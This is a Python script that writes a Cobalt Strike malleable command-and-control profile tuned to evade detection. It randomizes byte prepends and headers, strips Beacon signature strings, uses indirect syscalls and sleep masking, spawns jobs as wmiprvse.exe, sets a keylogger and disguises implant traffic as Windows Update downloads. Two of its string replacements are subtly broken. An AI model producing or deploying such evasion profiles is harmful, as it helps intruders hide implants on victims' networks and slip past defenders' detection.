#!/usr/bin/env python3

import random
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--output", required=False, help="(Optional) Specify output file name. Default: cobalt.profile", default='cobalt.profile')
parser.add_argument("--sleep", required=False, help="(Optional) Specify desired sleep time in ms. Default: 60000", default='60000')

parser.add_argument('--redirector', required=False, help="(Optional) Set if you are using a redirector", action='store_true')
group = parser.add_argument_group('redirector')
group.add_argument("--domain", action="store", required='--redirector', help="FQDN for the domain you will be using in your redirector")
group.add_argument("--password", action="store", required='--redirector', help="Password for your domain, must be the same password for your keystore.")
args = parser.parse_args()

# Function to generate a "rich header" with random assembly opcodes
def generate_junk_assembly(length):
    return ''.join([chr(random.randint(0, 255)) for _ in range(length)])

def generate_rich_header(length):
    rich_header = generate_junk_assembly(length)
    rich_header_hex = ''.join([f"\\x{ord(c):02x}" for c in rich_header])
    return rich_header_hex

def get_jitter() -> str:
    "Set Random Jitter"
    low = 20
    high = 69
    return str(random.randint(low, high))

def get_user_agent() -> str:
    "Return random user agent"
    random_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",       # windows / chrome
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",       # windows / chrome
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",                                      # windows / firefox
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",                                      # windows / firefox
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", # mac / safari
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", # mac / safari
    ]

    return random_user_agents[random.randint(0, len(random_user_agents) - 1)]

# Generate a rich header
rich_header = generate_rich_header(random.randint(5, 20) * 4)

# Define the byte strings to shuffle
byte_strings = [
    "40", "41", "42", "6690", "40", "43", "44", "45", "46", "47", "48", "49",
    "4c", "90", "0f1f00", "660f1f0400", "0f1f0400", "0f1f00", "0f1f00", "87db",
    "87c9", "87d2", "6687db", "6687c9", "6687d2"
]

# Shuffle the byte strings
random.shuffle(byte_strings)

# Create a new list to store the formatted bytes
formatted_bytes = []

# Format the byte strings
for byte_string in byte_strings:
    if len(byte_string) > 2:
        byte_list = [byte_string[i:i+2] for i in range(0, len(byte_string), 2)]
        formatted_bytes.append(''.join([f'\\x{byte}' for byte in byte_list]))
    else:
        formatted_bytes.append(f'\\x{byte_string}')

# Join the formatted bytes into a single string
formatted_string = ''.join(formatted_bytes)

# Here is an example template where you want to replace the text "REPLACE_PREPEND"
stub = """
set sleeptime "REPLACE_SLEEPTIME";
set jitter    "REPLACE_JITTER";
# set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.133 Safari/537.36";
set useragent "REPLACE_USERAGENT";

# Task and Proxy Max Size
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

set data_jitter "50";
set smb_frame_header "";
set pipename "W32TIME_ALT_3490";
set pipename_stager "W32TIME_ALT_2429";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)";
set ssh_pipename "W32TIME_ALT_##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}

#IF_USE_REDIRECTOR

stage {
        set obfuscate "true";
        set stomppe "true";
        set cleanup "true";
        set userwx "false";
        set smartinject "true";
        set syscall_method "Indirect";


        #TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
        #They will also obfuscate themselves while they wait to read information from their parent Beacon.
        set sleep_mask "true";


        set checksum       "0";
        set compile_time   "10 Aug 2018 19:22:06";
        set entry_point    "869360";
        set image_size_x86 "1638400";
        set image_size_x64 "1638400";
        set name           "libcrypto.dll";
        set rich_header  "REPLACE_RICH_HEADER";
        set magic_mz_x86 "NnOD";
        set magic_mz_x64 "MNOD";
        set magic_pe "EA";


        transform-x86 {
                prepend "REPLACE_PREPEND"; # new instruction set with inverse pairings
                strrep "\\x4D\\x5A\\x41\\x52\\x55\\x48\\x89\\xE5\\x48\\x81\\xEC\\x20\\x00\\x00\\x00\\x48\\x8D\\x1D\\xEA\\xFF\\xFF\\xFF\\x48\\x89\\xDF\\x48\\x81\\xC3\\xA4\\x6E\\x01\\x00\\xFF\\xD3\\x41\\xB8\\xF0\\xB5\\xA2\\x56\\x68\\x04\\x00\\x00\\x00\\x5A\\x48\\x89\\xF9\\xFF\\xD0" "\\x4D\\x5A\\x48\\x8D\\x1D\\xF8\\xFF\\xFF\\xFF\\x41\\x52\\x48\\x83\\xEC\\x28\\x48\\x89\\xDF\\x48\\x81\\xC3\\x52\\xB7\\x00\\x00\\x48\\x81\\xC3\\x52\\xB7\\x00\\x00\\xFF\\xD3\\x48\\xC7\\xC2\\x04\\x00\\x00\\x00\\x48\\x89\\xF9\\xFF\\xD0";
                strrep "ReflectiveLoader" "LoadDataImage";
                strrep "This program cannot be run in DOS mode" "Please Refer To Manual";
                strrep "(admin)""(adm)";
                strrep "is an x64 process (can't inject x86 content)" "cant go from 86 to 64";
                strrep "is an x86 process (can't inject x64 content)" "cant go from 64 to 86"; 
                strrep "I'm already in SMB mode" "smbmodeengaged";
                strrep "msvcrt.dll" "";
                strrep "C:\\\Windows\\\System32\\\msvcrt.dll" "";
                strrep "This program cannot be run in DOS mode" "";
                strrep "Stack around the variable" "";
                strrep "was corrupted." "";
                strrep "The variable" "";
                strrep "is being used without being initialized." "";
                strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
                strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
                strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
                strrep "Stack memory was corrupted" "";
                strrep "A local variable was used before it was initialized" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around" "corrupted";
                strrep "operator" "";
                strrep "operator co_await" "";
                strrep "operator<=>" "";

                }



        transform-x64 {
                prepend "\\xFF\\xC0\\xFF\\xC8"; # new instruction set with inverse pairings
                prepend "REPLACE_PREPEND"; # new instruction set with inverse pairings
                strrep "(admin)""(adm)";
                strrep "msvcrt.dll" "";
                strrep "C:\\\Windows\\\System32\\\msvcrt.dll" "";
                strrep "is an x64 process (can't inject x86 content)" "cant go from 86 to 64";
                strrep "is an x86 process (can't inject x64 content)" "cant go from 64 to 86";
                strrep "I'm already in SMB mode" "smbmodeengaged";
                strrep "ReflectiveLoader" "LoadData";
                strrep "This program cannot be run in DOS mode" "please see manual";
                strrep "beacon.x64.dll" "treme.x64.dll";
                strrep "beacon.dll" "beaker.dll";
                strrep "Stack around the variable" "";
                strrep "was corrupted." "";
                strrep "The variable" "";
                strrep "is being used without being initialized." "";
                strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
                strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
                strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
                strrep "Stack memory was corrupted" "";
                strrep "A local variable was used before it was initialized" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around" "corrupted";
                strrep "operator" "";
                strrep "operator co_await" "";
                strrep "operator<=>" "";
                }
}


process-inject {
    # set remote memory allocation technique
      
    set allocator "NtMapViewOfSection";
    set bof_reuse_memory "true";
    # shape the content and properties of what we will inject
    set min_alloc "38634";
    set userwx    "false";
    set startrwx "false";

    transform-x86 {
        prepend "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"; # NOP, NOP!
    }

   

}

post-ex {
    # control the temporary process we spawn to

    set spawnto_x86 "%windir%\\\syswow64\\\wbem\\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\\sysnative\\\wbem\\\wmiprvse.exe -Embedding";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
    set pipename "W32TIME_ALT_####"; 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "false";

        # control the method used to log keystrokes 
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}


http-config {

        #set "true" if teamserver is behind redirector
        set trust_x_forwarded_for "false";
}

http-get {
set uri "/c/msdownload/update/others/2022/11/lvJH6WKebIxYOP5aqCjtB ";



client {

        header "Accept" "*/*";
        header "Host" "10.9.253.6";

        metadata {
                base64url;
                append ".bin";
                uri-append;
        }
}


server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        output {

                print;
        }
}
}

http-post {
set uri "/c/msdownload/update/others/2023/1/XPsPk-qQVhdGPkRajly9Z ";


set verb "GET";

client {

        header "Accept" "*/*";


        id {
                prepend "download.windowsupdate.com/c/";
                header "Host";
        }


        output {
                base64url;
                append ".bin";
                uri-append;
        }
}

server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        output {
                print;
        }
}
}

http-stager {
    set uri_x86 "/_init.gif";
    set uri_x64 "/__init.gif";

    server {
        header "Content-Type" "image/gif";

        output {
            prepend "\\x01\\x00\\x01\\x00\\x00\\x02\\x01\\x44\\x00\\x3b";
            prepend "\\xff\\xff\\xff\\x21\\xf9\\x04\\x01\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00";
            prepend "\\x47\\x49\\x46\\x38\\x39\\x61\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\x00\\x00";
            print;
        }
    }
}
"""

def redirector_cert_info(domain: str, password: str) -> str:
    redir_info = f"""
https-certificate {{
    set keystore "{domain}.store";
    set password "{password}";
}}

code-signer {{
    set keystore "{domain}.jks";
    set password "{password}";
    set alias "{domain}";
}}
    """
    return redir_info

# This next section could 100% have cleaner code/be more efficient
# Its done this way for readability, plus if someone wants to edit it later it should be easy
stub = stub.replace("REPLACE_PREPEND", formatted_string)
stub = stub.replace("REPLACE_RICH", rich_header)
stub = stub.replace("REPLACE_JITTER", get_jitter())
stub = stub.replace("REPLACE_USERAGENT", get_user_agent())

if args.redirector:
    print("[+] Setting up for use with redirector")
    stub = stub.replace('set trust_x_forwarded_for "false;', 'set trust_x_forwarded_for "true;')
    stub = stub.replace('#IF_USE_REDIRECTOR', redirector_cert_info(args.domain, args.password))

stub = stub.replace("REPLACE_SLEEPTIME", args.sleep)
print(f"[+] Using sleep time of {args.sleep}ms ({int(args.sleep) / 1000} seconds)")

print(f"[+] Outputting to file: '{args.output}'")

with open(args.output, 'w') as file:
    file.write(stub)
